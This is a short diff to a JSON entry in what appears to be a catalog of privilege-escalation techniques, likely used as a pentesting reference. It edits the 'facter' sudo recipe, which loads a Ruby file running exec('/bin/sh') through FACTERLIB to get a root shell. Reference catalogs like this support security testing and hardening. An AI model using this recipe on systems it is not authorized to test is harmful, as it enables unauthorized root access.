@@ -7,7 +7,7 @@
     ],
     "sudo": [
       {
-        "code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nFACTERLIB=$TF sudo -E facter\n"
+        "code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n"
       }
     ]
   }
